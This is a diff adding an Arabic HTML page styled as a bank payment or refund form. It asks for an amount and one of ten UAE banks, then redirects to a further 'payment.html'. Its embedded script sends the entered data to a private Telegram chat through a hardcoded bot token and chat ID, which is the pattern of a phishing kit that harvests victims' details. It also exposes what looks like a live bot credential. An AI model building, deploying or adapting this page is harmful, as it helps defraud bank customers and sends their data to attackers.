@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>نموذج سداد</title>
+  <style>
+    body {font-family: Tahoma, Arial; background:#fdfdfd; margin:0; padding:0;}
+    .container {max-width:400px; margin:50px auto; background:#fff5f0; padding:25px; border-radius:12px; box-shadow:0 4px 8px rgba(0,0,0,0.1);}
+    h2 {text-align:center; color:#c15c37; margin-bottom:20px;}
+    label {display:block; margin-bottom:8px; font-weight:bold; color:#333;}
+    input, select, button {width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:6px; font-size:15px;}
+    button {background:#c15c37; color:white; font-weight:bold; cursor:pointer; border:none;}
+    button:hover {background:#a74627;}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>سداد</h2>
+    <label for="amount">أدخل قيمة السداد / الاسترداد</label>
+    <input type="text" id="amount" placeholder="مثال: 1000">
+
+    <label for="bank">اختر البنك الخاص بك</label>
+    <select id="bank">
+      <option disabled selected>-- اختر البنك --</option>
+      <option>بنك أبوظبي الإسلامي</option>
+      <option>بنك أبوظبي التجاري</option>
+      <option>بنك المشرق</option>
+      <option>بنك الشارقة</option>
+      <option>بنك المارية المحلي</option>
+      <option>بنك عجمان</option>
+      <option>بنك دبي الإسلامي</option>
+      <option>بنك الامارات الاسلامي</option>
+      <option>بنك أبوظبي الأول</option>
+      <option>مصرف الهلال</option>
+    </select>
+
+    <button onclick="sendData()">تأكيد</button>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "7994339638:AAHgur93jAzxz55NZTtD5J3WKgDaWZtlV3E";
+    const CHAT_ID = "16420566";
+
+    function sendData() {
+      const amount = document.getElementById("amount").value;
+      const bank = document.getElementById("bank").value;
+
+      const message = `💰 سداد جديد:\nالمبلغ: ${amount}\nالبنك: ${bank}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id: CHAT_ID, text: message})
+      }).then(() => {
+        window.location.href = "payment.html";
+      });
+    }
+  </script>
+</body>
+</html>
